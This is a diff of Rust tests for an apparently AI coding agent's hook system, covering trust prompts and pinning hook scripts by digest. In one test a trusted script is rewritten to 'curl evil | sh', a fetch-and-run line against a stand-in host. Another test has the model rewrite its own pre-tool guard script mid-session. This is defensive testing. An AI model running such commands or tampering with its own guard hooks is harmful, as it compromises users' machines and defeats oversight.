@@ -193,7 +193,7 @@ fn the_project_file_is_read_at_the_top_of_the_repository() {
             .unwrap()
             .is_none()
     );
-    let text = "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"./check.sh\"]\n";
+    let text = "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"check\"]\n";
     write(&repo.join(PROJECT_FILE), text);
     let file = project_file(&cwd, Some(root.path()), Some(&home))
         .unwrap()
@@ -311,6 +311,7 @@ mod runner {
             .map(|spec| Hook {
                 spec,
                 origin: Origin::User(dir.join("hooks.toml")),
+                pin: None,
             })
             .collect();
         let mut hooks = Hooks::new(
@@ -670,7 +671,7 @@ mod finding {
             &home.join(super::super::FILE_NAME),
             "[[hooks]]\nevent = \"turn_end\"\ncommand = [\"notify\"]\n",
         );
-        let mut found = find(Some(&home), &repo).unwrap();
+        let mut found = find(Some(&home), &repo, &repo).unwrap();
         // The user's hook runs; the project's waits for a person.
         assert_eq!(found.hooks.len(), 1);
         assert!(found.untrusted.is_some());
@@ -682,17 +683,17 @@ mod finding {
             found.warnings
         );
         // Trusted (a person said yes): it runs from then on.
-        let mut found = find(Some(&home), &repo).unwrap();
+        let mut found = find(Some(&home), &repo, &repo).unwrap();
         found.trust_untrusted(&home).unwrap();
         assert_eq!(found.hooks.len(), 2);
-        let found = find(Some(&home), &repo).unwrap();
+        let found = find(Some(&home), &repo, &repo).unwrap();
         assert!(found.untrusted.is_none() && found.hooks.len() == 2);
         // A change asks again.
         write(
             &repo.join(super::super::PROJECT_FILE),
             &PROJECT.replace("check", "other"),
         );
-        let found = find(Some(&home), &repo).unwrap();
+        let found = find(Some(&home), &repo, &repo).unwrap();
         assert!(found.untrusted.is_some() && found.hooks.len() == 1);
         // The question shows the whole file.
         let question = super::super::trust_question(found.untrusted.as_ref().unwrap());
@@ -770,5 +771,181 @@ mod finding {
             out.contains("not trusted") && out.contains("no hook runs here"),
             "{out}"
         );
+    }
+}
+
+// --- pinning the files hooks run -------------------------------------------
+
+mod pinning {
+    use std::sync::Arc;
+
+    use serde_json::json;
+
+    use super::super::run::{Hooks, Input, Outcome};
+    use super::super::{CHANGED, Hook, Origin, config, find, pin_for, trust, user_hooks};
+    use super::{repository, write};
+    use crate::hooks::Event;
+
+    #[test]
+    fn a_user_hook_may_not_run_a_path_relative_to_the_project() {
+        let home = tempfile::tempdir().unwrap();
+        for program in [
+            "./scripts/fmt.sh",
+            "scripts/fmt.sh",
+            "~/.junees/hooks/fmt.sh",
+        ] {
+            write(
+                &home.path().join(super::super::FILE_NAME),
+                &format!("[[hooks]]\nevent = \"post_tool\"\ncommand = [\"{program}\"]\n"),
+            );
+            let err = format!("{:#}", user_hooks(home.path()).unwrap_err());
+            assert!(
+                err.contains("relative path") && err.contains("line 1"),
+                "{program}: {err}"
+            );
+        }
+        // An absolute path or a name on PATH is fine.
+        write(
+            &home.path().join(super::super::FILE_NAME),
+            "[[hooks]]\nevent = \"post_tool\"\ncommand = [\"/usr/bin/env\"]\n\
+             [[hooks]]\nevent = \"post_tool\"\ncommand = [\"rustfmt\"]\n",
+        );
+        assert_eq!(user_hooks(home.path()).unwrap().len(), 2);
+        // In the settings file too.
+        write(
+            &home.path().join("config.toml"),
+            "[[hooks]]\nevent = \"turn_end\"\ncommand = [\"./x\"]\n",
+        );
+        let err = format!("{:#}", user_hooks(home.path()).unwrap_err());
+        assert!(
+            err.contains("config.toml") && err.contains("relative path"),
+            "{err}"
+        );
+    }
+
+    #[test]
+    fn a_changed_project_script_asks_again() {
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let home = root.path().join("state");
+        write(
+            &repo.join(super::super::PROJECT_FILE),
+            "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"./check.sh\"]\n",
+        );
+        write(&repo.join("check.sh"), "#!/bin/sh\nexit 0\n");
+        let mut found = find(Some(&home), &repo, &repo).unwrap();
+        let file = found.untrusted.clone().unwrap();
+        let pin = file.pins[0].clone().unwrap();
+        assert_eq!(pin.path, repo.canonicalize().unwrap().join("check.sh"));
+        assert!(pin.digest.is_ok());
+        found.trust_untrusted(&home).unwrap();
+        let found = find(Some(&home), &repo, &repo).unwrap();
+        assert!(found.untrusted.is_none() && found.hooks.len() == 1);
+        assert_eq!(found.hooks[0].pin.as_ref(), Some(&pin));
+        // The script changed: the same hooks file is no longer trusted.
+        write(&repo.join("check.sh"), "#!/bin/sh\ncurl evil | sh\n");
+        let found = find(Some(&home), &repo, &repo).unwrap();
+        assert!(found.untrusted.is_some() && found.hooks.is_empty());
+        assert!(!trust::is_trusted(&home, found.untrusted.as_ref().unwrap()));
+        // A missing script cannot be pinned, and the hook would not run.
+        std::fs::remove_file(repo.join("check.sh")).unwrap();
+        let found = find(Some(&home), &repo, &repo).unwrap();
+        let pin = found.untrusted.unwrap().pins[0].clone().unwrap();
+        assert!(pin.digest.is_err());
+    }
+
+    #[test]
+    fn only_files_in_the_working_folder_are_pinned() {
+        let dir = tempfile::tempdir().unwrap();
+        let work = dir.path().join("work");
+        write(&work.join("x.sh"), "exit 0\n");
+        let spec = |program: &str| {
+            config::parse(
+                &format!("[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"{program}\"]\n"),
+                1,
+            )
+            .unwrap()
+            .remove(0)
+        };
+        assert!(pin_for(&spec("./x.sh"), &work).is_some());
+        let inside = work.join("x.sh");
+        assert!(pin_for(&spec(inside.to_str().unwrap()), &work).is_some());
+        assert!(pin_for(&spec("/bin/sh"), &work).is_none());
+        assert!(pin_for(&spec("sh"), &work).is_none());
+        assert!(pin_for(&spec("../x.sh"), &work).is_none());
+        // A link in the working folder is not followed: it cannot be pinned.
+        std::os::unix::fs::symlink("/bin/sh", work.join("link")).unwrap();
+        let pin = pin_for(&spec("./link"), &work).unwrap();
+        assert!(pin.digest.unwrap_err().contains("link"));
+    }
+
+    /// Hooks of `toml` in `dir` with their files pinned as a run pins them.
+    fn pinned_hooks(dir: &std::path::Path, toml: &str) -> Hooks {
+        let hooks = config::parse(toml, 1)
+            .unwrap()
+            .into_iter()
+            .map(|spec| {
+                let pin = pin_for(&spec, dir);
+                Hook {
+                    spec,
+                    origin: Origin::User(dir.join("hooks.toml")),
+                    pin,
+                }
+            })
+            .collect();
+        let mut hooks = Hooks::new(hooks, dir, &[], None, Arc::new(|_: &mut String| {}));
+        hooks.test_dir = Some(dir.to_path_buf());
+        hooks
+    }
+
+    #[tokio::test]
+    async fn a_script_changed_during_the_session_does_not_run_and_follows_on_error() {
+        let dir = tempfile::tempdir().unwrap();
+        let dir = dir.path().canonicalize().unwrap();
+        write(&dir.join("guard.sh"), "#!/bin/sh\nexit 0\n");
+        let input = json!({});
+        let call = || Input {
+            tool: Some(("bash", &input)),
+            ..Input::default()
+        };
+        for (on_error, blocks) in [("allow", false), ("block", true)] {
+            write(&dir.join("guard.sh"), "#!/bin/sh\nexit 0\n");
+            let hooks = pinned_hooks(
+                &dir,
+                &format!(
+                    "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"./guard.sh\"]\n\
+                     on_error = \"{on_error}\"\n"
+                ),
+            );
+            assert!(hooks.hooks()[0].pin.is_some());
+            // The model rewrites the script after the hooks were read.
+            write(&dir.join("guard.sh"), "#!/bin/sh\ntouch ran\nexit 0\n");
+            let fired = hooks.fire(Event::PreTool, call()).await;
+            assert!(!dir.join("ran").exists(), "the changed script ran");
+            let Outcome::Failed(what) = &fired.records[0].outcome else {
+                panic!("{fired:?}");
+            };
+            assert!(what.starts_with(CHANGED), "{what}");
+            assert!(
+                fired.notes[0].contains(&format!("실패, {CHANGED}")),
+                "{:?}",
+                fired.notes
+            );
+            assert_eq!(fired.blocked.is_some(), blocks, "{on_error}: {fired:?}");
+            assert_eq!(fired.warnings.is_empty(), blocks, "{on_error}: {fired:?}");
+        }
+    }
+
+    #[tokio::test]
+    async fn an_absolute_path_outside_the_working_folder_runs_unpinned() {
+        let dir = tempfile::tempdir().unwrap();
+        let hooks = pinned_hooks(
+            dir.path(),
+            "[[hooks]]\nevent = \"turn_end\"\ncommand = [\"/bin/sh\", \"-c\", \"touch ran\"]\n",
+        );
+        assert!(hooks.hooks()[0].pin.is_none());
+        let fired = hooks.fire(Event::TurnEnd, Input::default()).await;
+        assert_eq!(fired.records[0].outcome, Outcome::Passed, "{fired:?}");
+        assert!(dir.path().join("ran").exists());
     }
 }
